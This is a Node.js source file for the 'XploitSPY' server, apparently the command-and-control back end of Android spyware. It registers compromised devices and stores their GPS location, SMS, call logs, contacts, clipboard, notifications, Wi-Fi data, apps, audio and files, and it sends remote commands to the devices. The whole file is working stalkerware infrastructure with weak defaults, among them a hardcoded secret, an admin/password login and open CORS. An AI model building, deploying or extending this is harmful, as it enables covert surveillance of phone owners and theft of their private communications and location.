const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const sqlite3 = require('sqlite3').verbose();
const bcrypt = require('bcrypt');
const session = require('express-session');
const cors = require('cors');
const bodyParser = require('body-parser');
const compression = require('compression');
const path = require('path');
const fs = require('fs');
const { initializeFirebase, syncFromFirestore, sendCommandToDevice } = require('./firebase');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"],
    credentials: true
  },
  transports: ['websocket', 'polling'],
  allowEIO3: true
});

// Middleware
app.use(compression());
app.use(cors());
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));
app.use(express.static(path.join(__dirname, '../web/dist')));

// Session configuration
app.use(session({
  secret: 'xploitspy-secret-key-change-in-production',
  resave: false,
  saveUninitialized: false,
  cookie: { secure: false, maxAge: 24 * 60 * 60 * 1000 } // 24 hours
}));

// Database initialization
const dbPath = path.join(__dirname, 'data', 'xploitspy.db');
const dataDir = path.join(__dirname, 'data');

if (!fs.existsSync(dataDir)) {
  fs.mkdirSync(dataDir, { recursive: true });
}

const db = new sqlite3.Database(dbPath, (err) => {
  if (err) {
    console.error('Error opening database:', err);
  } else {
    console.log('Database connected');
    initializeDatabase();
  }
});

// Initialize database tables
function initializeDatabase() {
  // Users table
  db.run(`CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT UNIQUE NOT NULL,
    password TEXT NOT NULL,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
  )`, (err) => {
    if (err) console.error('Error creating users table:', err);
    else {
      // Create default admin user
      const defaultPassword = bcrypt.hashSync('password', 10);
      db.run(`INSERT OR IGNORE INTO users (username, password) VALUES (?, ?)`, 
        ['admin', defaultPassword], (err) => {
        if (err) console.error('Error creating admin user:', err);
        else console.log('Default admin user created');
      });
    }
  });

  // Devices table
  db.run(`CREATE TABLE IF NOT EXISTS devices (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    device_id TEXT UNIQUE NOT NULL,
    device_name TEXT,
    product_name TEXT,
    android_version TEXT,
    last_seen DATETIME DEFAULT CURRENT_TIMESTAMP,
    status TEXT DEFAULT 'offline',
    battery_level INTEGER,
    is_charging INTEGER DEFAULT 0,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
  )`);
  
  // Add missing columns to existing devices table (migration)
  // SQLite doesn't support IF NOT EXISTS for ALTER TABLE, so we catch errors
  db.run(`ALTER TABLE devices ADD COLUMN status TEXT DEFAULT 'offline'`, (err) => {
    if (err && !err.message.includes('duplicate column name')) {
      // Column already exists or other error, ignore
    }
  });
  db.run(`ALTER TABLE devices ADD COLUMN battery_level INTEGER`, (err) => {
    if (err && !err.message.includes('duplicate column name')) {
      // Column already exists or other error, ignore
    }
  });
  db.run(`ALTER TABLE devices ADD COLUMN is_charging INTEGER DEFAULT 0`, (err) => {
    if (err && !err.message.includes('duplicate column name')) {
      // Column already exists or other error, ignore
    }
  });
  db.run(`ALTER TABLE devices ADD COLUMN product_name TEXT`, (err) => {
    if (err && !err.message.includes('duplicate column name')) {
      // Column already exists or other error, ignore
    }
  });

  // GPS logs
  db.run(`CREATE TABLE IF NOT EXISTS gps_logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    device_id TEXT NOT NULL,
    latitude REAL,
    longitude REAL,
    accuracy REAL,
    altitude REAL,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (device_id) REFERENCES devices(device_id)
  )`);

  // SMS logs
  db.run(`CREATE TABLE IF NOT EXISTS sms_logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    device_id TEXT NOT NULL,
    phone_number TEXT,
    message TEXT,
    type TEXT,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (device_id) REFERENCES devices(device_id)
  )`);

  // Call logs
  db.run(`CREATE TABLE IF NOT EXISTS call_logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    device_id TEXT NOT NULL,
    phone_number TEXT,
    call_type TEXT,
    duration INTEGER,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (device_id) REFERENCES devices(device_id)
  )`);

  // Contacts
  db.run(`CREATE TABLE IF NOT EXISTS contacts (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    device_id TEXT NOT NULL,
    name TEXT,
    phone_number TEXT,
    email TEXT,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (device_id) REFERENCES devices(device_id)
  )`);

  // Installed apps
  db.run(`CREATE TABLE IF NOT EXISTS installed_apps (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    device_id TEXT NOT NULL,
    app_name TEXT,
    package_name TEXT,
    version TEXT,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (device_id) REFERENCES devices(device_id)
  )`);

  // Clipboard logs
  db.run(`CREATE TABLE IF NOT EXISTS clipboard_logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    device_id TEXT NOT NULL,
    content TEXT,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (device_id) REFERENCES devices(device_id)
  )`);

  // Notifications
  db.run(`CREATE TABLE IF NOT EXISTS notifications (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    device_id TEXT NOT NULL,
    app_name TEXT,
    title TEXT,
    content TEXT,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (device_id) REFERENCES devices(device_id)
  )`);

  // WiFi networks
  db.run(`CREATE TABLE IF NOT EXISTS wifi_networks (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    device_id TEXT NOT NULL,
    ssid TEXT,
    bssid TEXT,
    capabilities TEXT,
    frequency INTEGER,
    level INTEGER,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (device_id) REFERENCES devices(device_id)
  )`);

  // Commands queue
  db.run(`CREATE TABLE IF NOT EXISTS commands (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    device_id TEXT NOT NULL,
    command TEXT NOT NULL,
    parameters TEXT,
    status TEXT DEFAULT 'pending',
    result TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    executed_at DATETIME,
    FOREIGN KEY (device_id) REFERENCES devices(device_id)
  )`);

  // Audio recordings
  db.run(`CREATE TABLE IF NOT EXISTS audio_recordings (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    device_id TEXT NOT NULL,
    file_path TEXT,
    duration INTEGER,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (device_id) REFERENCES devices(device_id)
  )`);

  // Files
  db.run(`CREATE TABLE IF NOT EXISTS files (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    device_id TEXT NOT NULL,
    file_path TEXT,
    file_name TEXT,
    file_size INTEGER,
    file_type TEXT,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (device_id) REFERENCES devices(device_id)
  )`);

  console.log('Database tables initialized');
  
  // Initialize Firebase and start syncing
  const firestoreDb = initializeFirebase();
  if (firestoreDb) {
    syncFromFirestore(db, io);
  }
}

// Authentication middleware
function requireAuth(req, res, next) {
  if (req.session && req.session.user) {
    return next();
  }
  res.status(401).json({ error: 'Unauthorized' });
}

// Routes
app.post('/api/login', async (req, res) => {
  const { username, password } = req.body;
  
  db.get('SELECT * FROM users WHERE username = ?', [username], async (err, user) => {
    if (err) {
      return res.status(500).json({ error: 'Database error' });
    }
    
    if (!user) {
      return res.status(401).json({ error: 'Invalid credentials' });
    }
    
    const validPassword = await bcrypt.compare(password, user.password);
    if (!validPassword) {
      return res.status(401).json({ error: 'Invalid credentials' });
    }
    
    req.session.user = { id: user.id, username: user.username };
    res.json({ success: true, user: { username: user.username } });
  });
});

app.post('/api/logout', (req, res) => {
  req.session.destroy();
  res.json({ success: true });
});

app.get('/api/devices', requireAuth, (req, res) => {
  db.all('SELECT * FROM devices ORDER BY last_seen DESC', (err, devices) => {
    if (err) {
      return res.status(500).json({ error: 'Database error' });
    }
    res.json(devices);
  });
});

// Get dashboard statistics
app.get('/api/stats', requireAuth, (req, res) => {
  const stats = {
    totalGps: 0,
    totalSms: 0,
    totalCalls: 0,
    totalDevices: 0
  };
  
  // Count GPS logs
  db.get('SELECT COUNT(*) as count FROM gps_logs', (err, result) => {
    if (!err && result) {
      stats.totalGps = result.count;
    }
    
    // Count SMS logs
    db.get('SELECT COUNT(*) as count FROM sms_logs', (err, result) => {
      if (!err && result) {
        stats.totalSms = result.count;
      }
      
      // Count Call logs
      db.get('SELECT COUNT(*) as count FROM call_logs', (err, result) => {
        if (!err && result) {
          stats.totalCalls = result.count;
        }
        
        // Count Devices
        db.get('SELECT COUNT(*) as count FROM devices', (err, result) => {
          if (!err && result) {
            stats.totalDevices = result.count;
          }
          
          res.json(stats);
        });
      });
    });
  });
});

app.get('/api/devices/:deviceId/gps', requireAuth, (req, res) => {
  const { deviceId } = req.params;
  const limit = req.query.limit || 100;
  
  db.all(
    'SELECT * FROM gps_logs WHERE device_id = ? ORDER BY timestamp DESC LIMIT ?',
    [deviceId, limit],
    (err, logs) => {
      if (err) {
        return res.status(500).json({ error: 'Database error' });
      }
      res.json(logs);
    }
  );
});

app.get('/api/devices/:deviceId/sms', requireAuth, (req, res) => {
  const { deviceId } = req.params;
  const limit = req.query.limit || 100;
  
  db.all(
    'SELECT * FROM sms_logs WHERE device_id = ? ORDER BY timestamp DESC LIMIT ?',
    [deviceId, limit],
    (err, logs) => {
      if (err) {
        return res.status(500).json({ error: 'Database error' });
      }
      res.json(logs);
    }
  );
});

app.get('/api/devices/:deviceId/calls', requireAuth, (req, res) => {
  const { deviceId } = req.params;
  const limit = req.query.limit || 100;
  
  db.all(
    'SELECT * FROM call_logs WHERE device_id = ? ORDER BY timestamp DESC LIMIT ?',
    [deviceId, limit],
    (err, logs) => {
      if (err) {
        return res.status(500).json({ error: 'Database error' });
      }
      res.json(logs);
    }
  );
});

app.get('/api/devices/:deviceId/contacts', requireAuth, (req, res) => {
  const { deviceId } = req.params;
  
  db.all(
    'SELECT * FROM contacts WHERE device_id = ? ORDER BY name ASC',
    [deviceId],
    (err, contacts) => {
      if (err) {
        return res.status(500).json({ error: 'Database error' });
      }
      res.json(contacts);
    }
  );
});

app.get('/api/devices/:deviceId/apps', requireAuth, (req, res) => {
  const { deviceId } = req.params;
  
  db.all(
    'SELECT * FROM installed_apps WHERE device_id = ? ORDER BY app_name ASC',
    [deviceId],
    (err, apps) => {
      if (err) {
        return res.status(500).json({ error: 'Database error' });
      }
      res.json(apps);
    }
  );
});

app.get('/api/devices/:deviceId/clipboard', requireAuth, (req, res) => {
  const { deviceId } = req.params;
  const limit = req.query.limit || 100;
  
  db.all(
    'SELECT * FROM clipboard_logs WHERE device_id = ? ORDER BY timestamp DESC LIMIT ?',
    [deviceId, limit],
    (err, logs) => {
      if (err) {
        return res.status(500).json({ error: 'Database error' });
      }
      res.json(logs);
    }
  );
});

app.get('/api/devices/:deviceId/notifications', requireAuth, (req, res) => {
  const { deviceId } = req.params;
  const limit = req.query.limit || 100;
  
  db.all(
    'SELECT * FROM notifications WHERE device_id = ? ORDER BY timestamp DESC LIMIT ?',
    [deviceId, limit],
    (err, logs) => {
      if (err) {
        return res.status(500).json({ error: 'Database error' });
      }
      res.json(logs);
    }
  );
});

app.get('/api/devices/:deviceId/wifi', requireAuth, (req, res) => {
  const { deviceId } = req.params;
  
  db.all(
    'SELECT * FROM wifi_networks WHERE device_id = ? ORDER BY timestamp DESC',
    [deviceId],
    (err, networks) => {
      if (err) {
        return res.status(500).json({ error: 'Database error' });
      }
      res.json(networks);
    }
  );
});

app.post('/api/devices/:deviceId/commands', requireAuth, async (req, res) => {
  const { deviceId } = req.params;
  const { command, parameters } = req.body;
  
  // Try Firebase first (for cross-network)
  const firebaseCommandId = await sendCommandToDevice(deviceId, command, parameters);
  
  // Also save to SQLite
  db.run(
    'INSERT INTO commands (device_id, command, parameters, status) VALUES (?, ?, ?, ?)',
    [deviceId, command, JSON.stringify(parameters), 'pending'],
    function(err) {
      if (err) {
        return res.status(500).json({ error: 'Database error' });
      }
      
      // Emit command to device via socket (if connected)
      io.to(deviceId).emit('command', {
        id: this.lastID,
        command,
        parameters
      });
      
      res.json({ 
        success: true, 
        commandId: this.lastID,
        firebaseCommandId: firebaseCommandId || null
      });
    }
  );
});

app.get('/api/devices/:deviceId/commands', requireAuth, (req, res) => {
  const { deviceId } = req.params;
  
  db.all(
    'SELECT * FROM commands WHERE device_id = ? ORDER BY created_at DESC LIMIT 50',
    [deviceId],
    (err, commands) => {
      if (err) {
        return res.status(500).json({ error: 'Database error' });
      }
      res.json(commands);
    }
  );
});

// Serve web dashboard
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, '../web/dist/index.html'));
});

// Socket.IO connection handling
io.on('connection', (socket) => {
  console.log('Client connected:', socket.id);
  
  socket.on('register', (deviceInfo) => {
    const { deviceId, deviceName, androidVersion } = deviceInfo;
    socket.join(deviceId);
    
    // Update or create device
    db.run(
      `INSERT OR REPLACE INTO devices (device_id, device_name, android_version, last_seen)
       VALUES (?, ?, ?, datetime('now'))`,
      [deviceId, deviceName, androidVersion],
      (err) => {
        if (err) console.error('Error registering device:', err);
        else console.log(`Device registered: ${deviceId}`);
      }
    );
  });
  
  socket.on('gps', (data) => {
    const { deviceId, latitude, longitude, accuracy, altitude } = data;
    db.run(
      'INSERT INTO gps_logs (device_id, latitude, longitude, accuracy, altitude) VALUES (?, ?, ?, ?, ?)',
      [deviceId, latitude, longitude, accuracy, altitude],
      (err) => {
        if (err) console.error('Error saving GPS log:', err);
      }
    );
    io.emit('gps_update', data);
  });
  
  socket.on('sms', (data) => {
    const { deviceId, phoneNumber, message, type, timestamp } = data;
    const smsTimestamp = timestamp ? new Date(timestamp).toISOString() : new Date().toISOString();
    db.run(
      'INSERT INTO sms_logs (device_id, phone_number, message, type, timestamp) VALUES (?, ?, ?, ?, ?)',
      [deviceId, phoneNumber, message, type, smsTimestamp],
      (err) => {
        if (err) console.error('Error saving SMS log:', err);
      }
    );
    io.emit('sms_update', { ...data, timestamp: smsTimestamp });
  });
  
  socket.on('call', (data) => {
    const { deviceId, phoneNumber, callType, duration } = data;
    db.run(
      'INSERT INTO call_logs (device_id, phone_number, call_type, duration) VALUES (?, ?, ?, ?)',
      [deviceId, phoneNumber, callType, duration],
      (err) => {
        if (err) console.error('Error saving call log:', err);
      }
    );
    io.emit('call_update', data);
  });
  
  socket.on('contacts', (data) => {
    const { deviceId, contacts } = data;
    contacts.forEach(contact => {
      db.run(
        'INSERT OR REPLACE INTO contacts (device_id, name, phone_number, email) VALUES (?, ?, ?, ?)',
        [deviceId, contact.name, contact.phoneNumber, contact.email],
        (err) => {
          if (err) console.error('Error saving contact:', err);
        }
      );
    });
    io.emit('contacts_update', { deviceId, count: contacts.length });
  });
  
  socket.on('apps', (data) => {
    const { deviceId, apps } = data;
    apps.forEach(app => {
      db.run(
        'INSERT OR REPLACE INTO installed_apps (device_id, app_name, package_name, version) VALUES (?, ?, ?, ?)',
        [deviceId, app.name, app.packageName, app.version],
        (err) => {
          if (err) console.error('Error saving app:', err);
        }
      );
    });
    io.emit('apps_update', { deviceId, count: apps.length });
  });
  
  socket.on('clipboard', (data) => {
    const { deviceId, content } = data;
    db.run(
      'INSERT INTO clipboard_logs (device_id, content) VALUES (?, ?)',
      [deviceId, content],
      (err) => {
        if (err) console.error('Error saving clipboard log:', err);
      }
    );
    io.emit('clipboard_update', data);
  });
  
  socket.on('notification', (data) => {
    const { deviceId, appName, title, content } = data;
    db.run(
      'INSERT INTO notifications (device_id, app_name, title, content) VALUES (?, ?, ?, ?)',
      [deviceId, appName, title, content],
      (err) => {
        if (err) console.error('Error saving notification:', err);
      }
    );
    io.emit('notification_update', data);
  });
  
  socket.on('wifi', (data) => {
    const { deviceId, networks } = data;
    networks.forEach(network => {
      db.run(
        'INSERT OR REPLACE INTO wifi_networks (device_id, ssid, bssid, capabilities, frequency, level) VALUES (?, ?, ?, ?, ?, ?)',
        [deviceId, network.ssid, network.bssid, network.capabilities, network.frequency, network.level],
        (err) => {
          if (err) console.error('Error saving WiFi network:', err);
        }
      );
    });
    io.emit('wifi_update', { deviceId, count: networks.length });
  });
  
  socket.on('command_result', (data) => {
    const { commandId, result, success } = data;
    db.run(
      'UPDATE commands SET status = ?, result = ?, executed_at = datetime("now") WHERE id = ?',
      [success ? 'completed' : 'failed', JSON.stringify(result), commandId],
      (err) => {
        if (err) console.error('Error updating command:', err);
      }
    );
    io.emit('command_result_update', data);
  });
  
  socket.on('disconnect', () => {
    console.log('Client disconnected:', socket.id);
  });
});

const PORT = process.env.PORT || 3000;

server.listen(PORT, '0.0.0.0', () => {
  console.log(`XploitSPY Server running on port ${PORT}`);
  console.log(`Access dashboard at http://localhost:${PORT}`);
});

